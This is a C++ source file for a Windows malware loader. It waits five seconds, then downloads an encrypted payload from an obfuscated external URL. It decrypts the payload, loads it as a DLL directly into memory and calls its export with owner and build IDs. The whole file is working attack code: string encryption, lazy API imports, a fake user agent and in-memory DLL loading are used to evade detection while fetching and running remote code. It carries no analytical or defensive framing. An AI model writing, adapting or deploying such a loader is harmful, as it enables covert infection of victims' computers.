#include "Ecy.h"
#include "MemoryModule.h"
#include "MyFunctions.h"  // Your header file
#include <wininet.h>
#pragma comment(lib, "wininet.lib")
#pragma warning(disable : 4996)


#define DEBUG_MODE 0
typedef int (*MannotFunc)(std::string, std::string, std::string);

class CloudDLLLoader {
private:
	HMEMORYMODULE module;
	std::vector<uint8_t> dllBytes;

public:
	CloudDLLLoader() : module(nullptr) {}

	~CloudDLLLoader() {
		if (module) {
			MemoryFreeLibrary(module);
		}
	}

	bool loadDLLFromBytes(const std::vector<uint8_t>& bytes) {


		dllBytes = bytes;
		return loadDLLIntoMemory();
	}



private:
	bool loadDLLIntoMemory() {



		if (dllBytes.empty()) {
#if DEBUG_MODE
			std::cerr << EC("No DLL bytes to load!") << std::endl;

#endif
			return false;
		}

		module = MemoryLoadLibrary(dllBytes.data(), dllBytes.size());
		if (!module) {
#if DEBUG_MODE
			std::cerr << EC("Failed to load DLL from memory!") << std::endl;

#endif
			return false;
		}

#if DEBUG_MODE
		std::cout << EC("DLL loaded successfully into memory!") << std::endl;

#endif
		return true;
	}

public:


	MannotFunc getMannot() {

		auto encrypted = xorstr("Mannot");
		auto result = (MannotFunc)MemoryGetProcAddress(module, encrypted.crypt_get());
		encrypted.crypt();
		return result;
	}


	// Check if DLL is loaded
	bool isLoaded() const {



		return module != nullptr;
	}
};

std::string decrypt(const std::string& encryptedBase64, const std::string& key) {
	

	std::string decoded;
	std::vector<int> decodingTable(256, -1);

	auto encrypted = xorstr("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
	const std::string base64Chars = std::string(encrypted.crypt_get());
	encrypted.crypt(); // Re-encrypt to clear decrypted data

	for (size_t i = 0; i < base64Chars.size(); i++) {
		decodingTable[base64Chars[i]] = i;
	}

	int val = 0, valb = -8;
	for (unsigned char c : encryptedBase64) {
		if (decodingTable[c] == -1) break;
		val = (val << 6) + decodingTable[c];
		valb += 6;
		if (valb >= 0) {
			decoded.push_back((val >> valb) & 0xFF);
			valb -= 8;
		}
	}

	std::string encryptedData = decoded;
	std::string decrypted;
	size_t keyLength = key.size();

	for (size_t i = 0; i < encryptedData.size(); ++i) {
		decrypted += encryptedData[i] ^ key[i % keyLength];
	}

	return decrypted;
}

std::string GRS() {
	

	auto encrypted1 = xorstr("abcdefghijklmnopqrstuvwxyz");
	auto encrypted2 = xorstr("ABCDEFGHIJKLMNOPQRSTUVWXYZ");
	auto encrypted3 = xorstr("0123456789");

	const std::string charset =
		std::string(encrypted1.crypt_get()) +
		std::string(encrypted2.crypt_get()) +
		std::string(encrypted3.crypt_get());

	// Re-encrypt to clear decrypted data
	encrypted1.crypt();
	encrypted2.crypt();
	encrypted3.crypt();

	std::random_device rd;
	std::mt19937 gen(rd());
	std::uniform_int_distribution<> dist(0, charset.size() - 1);

	std::string result;
	result.reserve(23);
	for (size_t i = 0; i < 23; ++i) {
		result += charset[dist(gen)];
	}
	return result;
}

std::string DownloadString(std::string URL) {


	HINTERNET interwebs = InternetOpenA(EC("Mozilla/5.0 (Windows NT 14_73_31; WOW64)"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);

	HINTERNET urlFile;
	std::string rtn;
	if (interwebs) {
		urlFile = LI_FN(InternetOpenUrlA).safe_cached()(interwebs, URL.c_str(), NULL, NULL,
			INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, NULL);
		if (urlFile) {
			char buffer[20000];
			DWORD bytesRead;
			do {
				LI_FN(InternetReadFile).safe_cached()(urlFile, buffer, 20000, &bytesRead);
				rtn.append(buffer, bytesRead);
				LI_FN(memset).safe_cached()(buffer, 0, 20000);
			} while (bytesRead);
			LI_FN(InternetCloseHandle).safe_cached()(interwebs);
			LI_FN(InternetCloseHandle).safe_cached()(urlFile);
			return rtn;
		}
	}
	LI_FN(InternetCloseHandle).safe_cached()(interwebs);
	return rtn;

}


std::vector<uint8_t> Base64ToBytes(std::string bobak) {
	
	

	DWORD bytesNeeded;
	if (!LI_FN(CryptStringToBinaryA).safe()(bobak.c_str(), bobak.length(), CRYPT_STRING_BASE64, NULL, &bytesNeeded, NULL, NULL)) {

	}
	
	std::vector<BYTE> bytes(bytesNeeded);
	if (!LI_FN(CryptStringToBinaryA).safe()(bobak.c_str(), bobak.length(), CRYPT_STRING_BASE64, bytes.data(), &bytesNeeded, NULL, NULL)) {
		
	}

	return bytes;
}



auto ownrdid = xorstr("//OWNERID");
auto bldsid = xorstr("//BUILDID");

/*
auto ownrdid = xorstr("rz6zarjmaf0u9jq4v53hsnz4no61k2");
auto bldsid = xorstr("saSfsdfsdmtpimvUjW019");*/


/*
Turn it up, it's your favorite song
Dance, dance, dance to the distortion
Turn it up, keep it on repeat
Stumbling around like a wasted zombie

*/


INT WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, INT nCmdShow)
{
	

	

#if DEBUG_MODE
	AllocConsole();
	freopen(EC("CON"), EC("w"), stdout);
	freopen(EC("CON"), EC("w"), stderr);
#endif

	LI_FN(Sleep).safe_cached()(5000);

	

	auto enc1 = xorstr("https://krispykreme.top/Stb/PokerFace/init.php?id=");

	std::string MainURL = enc1.crypt_get();

	enc1.crypt();

	std::string FuncsRD = GRS();

	//std::cout << EC("Loader ID: ") << FuncsRD << std::endl;


	CloudDLLLoader loader;

	loader.loadDLLFromBytes(Base64ToBytes(decrypt(DownloadString(MainURL + FuncsRD), FuncsRD)));

	FuncsRD.clear();

	

	if (!loader.isLoaded()) {


#if DEBUG_MODE
		std::cerr << EC("DLL not loaded!") << std::endl;
#endif
		return 1;
	}


	auto MannotFucc = loader.getMannot();

	


#if DEBUG_MODE

	if (!MannotFucc)
	{
		(printf)(EC("Mainnot Failed \n"));
	}
#endif


#if DEBUG_MODE
	(printf)(EC("Beforea Enter \n"));

#endif

	MannotFucc(std::string(ownrdid.crypt_get()), std::string(bldsid.crypt_get()), MainURL);

	

}

